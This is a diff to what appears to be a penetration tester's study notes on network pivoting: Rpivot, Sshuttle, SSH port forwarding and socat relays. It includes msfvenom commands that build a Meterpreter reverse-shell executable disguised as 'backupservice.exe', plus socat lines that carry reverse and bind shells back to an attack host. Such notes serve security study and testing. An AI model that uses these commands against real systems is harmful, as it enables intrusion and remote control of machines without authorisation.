@@ -108,6 +108,20 @@ $ proxychains nmap -sn -v <target_internal_subnet>
 ```
 ![[meterpreter-socks-proxy.drawio.png]]
 
+### Web Server Pivoting with Rpivot
+[Rpivot](https://github.com/klsecservices/rpivot) us a reverse SOCKS proxy written in python, for SOCKS tunnelling. It allows us to bind a machine inside an internal network to an external server and exposes the client's local port on the server-side. This lets us access internal web servers from the outside.
+![[rpivot-webserver.webp]]
+1. Rpivot requires python 2.7, so we might need to install it
+```bash
+git clone https://github.com/klsecservices/rpivot.git
+sudo apt-get install python2.7
+```
+2. We can then connect to our pivot host
+```bash
+python2.7 server.py --proxy-port <port_to_use_for_proxy> --server-port <port_to_connect_to_server> --server-ip 0.0.0.0
+```
+
+
 ## Port Forwarding
 Port forwarding is *redirecting a communication request from one port to another*. TCP is used as the primary communication layer but application layer protocols like SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. Port forwarding can be a useful technique for bypassing firewalls and using existing services on the compromised host to pivot to other networks.
 
@@ -156,16 +170,27 @@ $ ssh -D 9050 user@x.x.x.x
 ![[Proxychains#Configuration]]
 3. Redirect [[Nmap]]'s packets to run through our proxy chain (*this is called SOCKS tunneling*)
 ![[Proxychains#Redirecting a tool's packets with proxychains]]
-
 ### SSH Pivoting with Sshuttle
+[Sshuttle](https://github.com/sshuttle/sshuttle) is a tool written in python that removes the need to configure proxychains. It only works over SSH (*not TOR or HTTPS though*). It is very useful for automating the execution of iptables and adding pivot rules for the remote host.
 
-
+1. Install [Sshuttle](https://github.com/sshuttle/sshuttle) on our attack machine
+```bash
+sudo apt-get install sshuttle
+```
+2. Connect to the pivot host and establish the entry in our `iptables` to redirect all traffic to the target subnet/IP through the pivot host
+```bash
+sudo sshuttle -r <user>@<pivot_host> <IP_or_subnet_to_route_through> -v
+```
+3. Run whatever tool we want to redirect
+```bash
+nmap -v -sn <target_subnet>
+```
 ### Remote/Reverse port forwarding with SSH
 Lets say we are able to connect to a pivot host and then connect to another system. If we wanted to *get a reverse shell* we would have to forward the traffic all the way back through our chain and to our attack machine. We would do this by having the reverse shell point to our nearest pivot host to the target, then from there we would forward all the traffic back through our chain from the pivot host.
 ![[pivot-reverse-shell.drawio.png]]
 1. Create the payload / reverse shell application with the connection details for the pivot host
 ```bash
-$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<internal_IP_of_pivot_host> LPORT=8080 -f exe -o backupservice.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<internal_IP_of_pivot_host> LPORT=8080 -f exe -o backupservice.exe
 ```
 2. Setup a `multi/handler` listening on our machine for the traffic
 ```bash
@@ -266,7 +291,7 @@ msf6 > use exploit/multi/handler
 ### Using [[Socat]] redirection for Reverse Shells
 1. Generate our payload (*that will connect to our pivot host*) and start a listener (*on our attack machine, waiting for the payload connection*) (eg. [[MSFVenom]] & [[Metasploit]] - `multi/handler`).
 2. Use [[Socat]] to start a listener on the pivot host, redirecting traffic it receives from our payload to our attack host.
-```sh
+```bash
 $ socat TCP4-LISTEN:<payload_traffic_port>, fork TPC4:<attack_host>:<port>
 ```
 3. Transfer the payload to the target system and execute, catch the reverse shell with the listener
@@ -274,7 +299,7 @@ $ socat TCP4-LISTEN:<payload_traffic_port>, fork TPC4:<attack_host>:<port>
 ### Using [[Socat]] redirection for Bind Shells
 1. Generate the bind shell payload (*specify the port to receive the connection on*) - [[MSFVenom]]
 2. Start the [[Socat]] bind shell listener on the pivot host
-```sh
+```bash
 $ socat TCP4-LISTEN:<pivot_host_port>, fork TCP4:<target_host>:<port_of_bind_shell>
 ```
 3. Start the bind shell listener on the attack machine that targets the pivot host's IP & port - [[Metasploit]] : `multi/handler`
